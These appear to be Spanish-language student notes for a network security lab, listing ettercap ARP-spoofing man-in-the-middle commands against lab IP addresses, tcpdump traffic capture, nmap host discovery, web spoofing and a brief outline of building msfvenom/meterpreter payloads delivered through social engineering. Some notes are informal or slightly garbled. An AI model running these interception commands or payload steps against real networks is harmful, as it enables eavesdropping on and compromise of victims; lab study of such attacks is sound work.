# A) v
Install ettercap
```bash
apt install ettercap-text-only
```
Funcionamiento:
```bash
ettercap [options][target1][target2]

ejemplo:
ettercap /10.11.48.56//
```
Con ettercap realizaremos ARP spoofing
# B) x
Captura de trafico, usando ettercap + wireshark para snifear y visualizar data (pdf, gif, ...)
## Solución
### Spoofing
Comando básico para realizar spoofing:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.48.142 //10.11.48.1
```
- -T, text mode
- -q, filtra lo que se muestra por pantalla.
- -i, establece la interfaz a usar.
- -M, man in de midel.
	- arp:remote, uso del MITM arp en remoto.
		- target
		- gateway

Guardar los paquetes recibidos:
```shell
//captura
tcpdump -i ens33 -s 65535 -w tcp_bisbi.pcap
//envio
scp lsi@10.11.48.143:/home/lsi/tcp_bisbi.pcap .
```
# C) v
Para obtener la mac del segmento usamos:
```
nmap -sP 10.11.48.0/23
```
- -sP, host discovery sobre un segmento mediante syng, ack y cmp 

respuestas con formato:
```
Nmap scan report for 10.11.49.17
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:F6:06 (VMware)
```
# D) x
Para obtener las ipv6 usamos:
```
ping6 -c 2 -I ens33 2002:a0b::1
ip -6 neigh
```
// todo lo de ipv6 sin fe....
# E) x
Capturar todo el trafico de alguna de nuestras interfaces, ettercap y tcpdump

Para obtener nuestro trafico tcp:
```shell
//tomamos el trafico tcp
tcpdump -i ens33 -s 65535 -w my.pcap
//recuperamos para usar wireshark
scp lsi@10.11.48.143:/home/lsi/my.pcap .
```
Usamos wireshark para analizar.
# F) x
Spoofing de web viendo simultáneamente la web (navegador de texto, xdg-open), se debe configurar el navegador en etter.conf.
//evaluación con la navegación en la victima y actualización en el atacante sin interacción
# G) x
Generación de peiloads y envió al atacado, la segunda parte es ingeniería social para que parezca natural.
Para creación:
- metasploit + msfvenom (neterpreter/shell/bash)
Social:
- filto ettercap
- ingeniería social